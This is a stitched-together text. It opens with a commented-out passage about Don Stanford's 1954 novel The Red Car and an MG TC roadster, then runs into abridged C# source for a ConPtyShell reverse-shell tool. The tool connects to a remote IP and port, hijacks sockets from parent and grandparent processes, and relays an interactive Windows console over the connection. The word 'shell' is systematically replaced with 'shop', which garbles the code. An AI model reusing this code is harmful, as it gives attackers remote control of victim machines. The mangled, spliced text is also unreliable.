...
#lean and racy and angular, with fenders that made no attempt to curve
#or blur into the body lines, but stood out in a clean sharp sweep over
#the wheels.
#“The wheels were enormous; they were almost ludicrous at first glance.
#They were gleaming silvery wire wheels, standing high and narrow with
#the rakish scarlet body of the car slung low between them, looking even
#now as though it were crouched close to the ground, ready to spring forward. The car looked
#almost alive. It had a personality all its own–an arrogant, insolent, challenging way of looking you
#right in the eye and saying ‘Drop dead!’”
#The above passage is from a slim paperback novel called The Red Car. It was written by Don
#Stanford and published by Scholastic Book Services in 1954. The car he is talking about is a 1948 MG TC roadster that Stanford’s main character, sixteen year-old Happy “Hap” Adams, is seeing for the first time.
    Param
    (
...
public static class ConPtyShell
{
    ...
    private static void TryParseRowsColsFromSocket(IntPtr shopSocket, ref uint rows, ref uint cols)
    {
        Thread.Sleep(500);//little tweak for slower connections
        byte[] received = new byte[100];
        int rowsTemp, colsTemp;
        int bytesReceived = recv(shopSocket, received, 100, 0);
        try
        {
    ...
    private static void ThreadReadPipeWriteSocketOverlapped(object threadParams)
    {
        ...
        IntPtr shopSocket = (IntPtr)threadParameters[1];
        int bufferSize = 8192;
        ...
        do
        {
            ...
            bytesSent = send(shopSocket, bytesToWrite, (int)dwBytesRead, 0);
    ...
    private static Thread StartThreadReadPipeWriteSocket(IntPtr OutputPipeRead, IntPtr shopSocket, bool overlappedSocket)
    {
        object[] threadParameters = new object[2];
        threadParameters[0] = OutputPipeRead;
        threadParameters[1] = shopSocket;
    ...
    private static void ThreadReadSocketWritePipeOverlapped(object threadParams)
    {
        ...
        do
        {
            ...
            nBytesReceived = recv(shopSocket, bytesReceived, bufferSize, 0);
    ...
    private static void ThreadReadSocketWritePipeNonOverlapped(object threadParams)
    {
        ...
        WSAEventSelect(shopSocket, wsaReadEvent, FD_READ);
    ...
    private static Thread StartThreadReadSocketWritePipe(IntPtr InputPipeWrite, IntPtr shopSocket, IntPtr hChildProcess, bool overlappedSocket)
    {
    ...
    public static string SpawnConPtyShell(string remoteIp, int remotePort, uint rows, uint cols, string commandLine, bool upgradeShell)
    {
        ...
        if (conptyCompatible)
        {
            Console.WriteLine("\r\nCreatePseudoConsole function found! Spawning a fully interactive shop\r\n");
            if (upgradeShell)
            {
                List<IntPtr> socketsHandles = new List<IntPtr>();
                ...
                shopSocket = SocketHijacking.DuplicateTargetProcessSocket(currentProcess, ref IsSocketOverlapped);
                if (shopSocket == IntPtr.Zero && parentProcess != null)
                {
                    // if no sockets are found in the current process we try to hijack our current parent process socket
                    shopSocket = SocketHijacking.DuplicateTargetProcessSocket(parentProcess, ref IsSocketOverlapped);
                    if (shopSocket == IntPtr.Zero && grandParentProcess != null)
                    {
                        // damn, even the parent process has no usable sockets, let's try a last desperate attempt in the grandparent process
                        shopSocket = SocketHijacking.DuplicateTargetProcessSocket(grandParentProcess, ref IsSocketOverlapped);
                        if (shopSocket == IntPtr.Zero)
                        {
                    ...
                    else
                    {
                        ...
                        if (grandParentProcess != null) grandParentSocketInherited = SocketHijacking.IsSocketInherited(shopSocket, grandParentProcess);
                    }
                }
                else
                {
                    // the current process got a usable socket, let's see if the parents use the socket
                    if (parentProcess != null) parentSocketInherited = SocketHijacking.IsSocketInherited(shopSocket, parentProcess);
                    if (grandParentProcess != null) grandParentSocketInherited = SocketHijacking.IsSocketInherited(shopSocket, grandParentProcess);
                }
            }
            else
            {
                shopSocket = connectRemote(remoteIp, remotePort);
                if (shopSocket == IntPtr.Zero)
                {
                    output += string.Format("{0}Could not connect to ip {1} on port {2}", errorString, remoteIp, remotePort.ToString());
                    return output;
                }
                TryParseRowsColsFromSocket(shopSocket, ref rows, ref cols);
            }
        ...
        else
        {
            if (upgradeShell)
            {
                output += string.Format("Could not upgrade shop to fully interactive because ConPTY is not compatible on this system");
                return output;
            }
            shopSocket = connectRemote(remoteIp, remotePort);
            if (shopSocket == IntPtr.Zero)
            ...
            Console.WriteLine("\r\nCreatePseudoConsole function not found! Spawning a netcat-like interactive shop...\r\n");
        ...
        if (upgradeShell) {
            ...
            if (!IsSocketOverlapped) SocketHijacking.SetSocketBlockingMode(shopSocket, 1);
        }
        //Threads have better performance than Tasks
        Thread thThreadReadPipeWriteSocket = StartThreadReadPipeWriteSocket(OutputPipeRead, shopSocket, IsSocketOverlapped);
        Thread thReadSocketWritePipe = StartThreadReadSocketWritePipe(InputPipeWrite, shopSocket, childProcessInfo.hProcess, IsSocketOverlapped);
        ...
        if (upgradeShell)
        {
            if (!IsSocketOverlapped)
            {
                ...
                WSAEventSelect(shopSocket, IntPtr.Zero, 0);
                SocketHijacking.SetSocketBlockingMode(shopSocket, 0);
            }
...
public static class ConPtyShellMainClass
{
    ...
    {
        string commandLine = "powershop.exe";
